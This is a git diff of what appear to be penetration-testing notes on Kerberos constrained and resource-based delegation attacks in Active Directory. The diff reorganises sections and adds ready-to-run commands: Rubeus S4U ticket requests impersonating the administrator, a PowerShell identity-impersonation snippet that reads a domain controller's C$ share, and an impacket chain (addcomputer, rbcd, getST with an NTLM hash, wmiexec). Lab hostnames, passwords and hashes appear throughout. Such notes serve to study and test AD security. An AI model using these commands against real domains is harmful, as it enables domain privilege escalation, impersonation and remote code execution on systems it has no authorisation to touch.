@@ -294,15 +294,13 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 ![Screenshot 2024-06-18 at 20-42-44 Kerberos Constrained Delegation Red Team Notes](https://github.com/kiro6/penetration-testing-notes/assets/57776872/dfc45db7-65f4-412f-b58f-8b904ff5c606)
 
 
-### Delegation form User
-
-#### With protocol transition
+### With protocol transition
 ![Screenshot_5](https://github.com/user-attachments/assets/8b3283ba-a2a6-4903-bdd5-e2d19f382d02)
 
 
 **Windows**
 ```powershell
-# if you are using the Delegation service (in a shell of context of the service) 
+# if you are using the Delegation service (in a shell of context of the service user) 
 ## request a delegation TGT for the user or computer
 .\Rubeus.exe tgtdeleg
 .\Rubeus.exe asktgt /user:<username> /password:<password> /domain:<>domain /outfile:ticket.kirbi
@@ -316,6 +314,17 @@ Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offe
 # if you are using diffrent shell context but you have the passowrd
 .\Rubeus.exe hash /password:Slavi123
 .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt
+
+
+# if u are in a shell of context of machine account or in other words you have a SYSTEM level privileges on a machine
+[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
+$idToImpersonate.Impersonate()
+[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+
+ls \\dc01.offense.local\c$
+
+## u can also use Rubeus
 ```
 
 **Linux**
@@ -328,16 +337,33 @@ wmiexec.py -k --no-pass domain/user@service
 
 ```
 
-### Delegation from System/Machine
+### Without protocol transition
+
+![Screenshot_4](https://github.com/user-attachments/assets/97af6de9-32ef-47f4-b5ab-bf7b7dffa23f)
+
+**Linux**
 ```shell
-# if u are in a shell of context of machine account or in other words you have a SYSTEM level privileges on a machine
+# target machine: winterfall$
+# machine with delgation rights: castelblack$ 
+# our user: jojo
+# created machine: house$
 
-[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
-$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
-$idToImpersonate.Impersonate()
-[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
 
-ls \\dc01.offense.local\c$
+# add computer X (house)
+addcomputer.py -computer-name 'house$' -computer-pass 'housepass' -dc-host 192.168.56.11 'domain/jojo:pass'
+
+# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity, we need castelblack$ machine creds or any PowerfulUser creds who us able to edit msDS-AllowedToActOnBehalfOfOtherIdentity value on castelblack$ 
+rbcd.py -delegate-from 'house$' -delegate-to 'castelblack$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
+
+# Do the s4u2self followed by the s4u2proxy on castelblack (this is the classic RBCD attack)
+getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 192.168.56.11 domain/'house$':'housepass'
+
+# s4u2proxy from constrained (castelblack) to target (winterfell) - with altservice to change the SPN in use, we must have castelblack$ creds
+getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket <'prev-obtained ticket'> -dc-ip 192.168.56.11 -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' domain/'castelblack$'
+
+# export the ticket 
+export KRB5CCNAME=/workspace/administrator@cifs_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache 
+wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
 ```
 
 
